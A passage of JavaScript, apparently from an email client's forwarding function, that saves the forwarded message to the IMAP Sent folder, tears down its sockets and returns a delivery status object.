    const sentBox = mailboxes.find(b => b.specialUse === '\\Sent' || b.path.toLowerCase().includes('sent') || b.path.toLowerCase().includes('envoy'));
    if (sentBox) {
      const rawRfc822 = `From: <${user}>\r\nTo: <${to}>\r\nSubject: ${subject.startsWith('Fwd:') ? subject : `Fwd: ${subject}`}\r\nDate: ${new Date().toUTCString()}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n${fullHtml}`;
      await imapClient.append(sentBox.path, Buffer.from(rawRfc822), ['\\Seen']);
      imapSaved = true;
    }
    if (imapClient.authenticated) await imapClient.logout();
  } catch { /* Non-fatal: SMTP delivery already done */ } finally {
    if (imapClient) {
      try {
        imapClient.removeAllListeners('error');
        imapClient.on('error', () => {});
      } catch {}
      try {
        if (imapClient.socket && !imapClient.socket.destroyed) imapClient.socket.destroy();
      } catch {}
      try { imapClient.close(); } catch {}
    }
    if (customSocket) {
      try { customSocket.destroy(); } catch {}
    }
  }

  return {
    success: true,
    smtpDelivered: smtpSuccess,
    imapAppended: imapSaved,
    forwardedTo: to,
    subject: subject.startsWith('Fwd:') ? subject : `Fwd: ${subject}`,
    fullText,
    fullHtml,
    warning: smtpError ? `SMTP notice: ${smtpError}` : null
  };
}
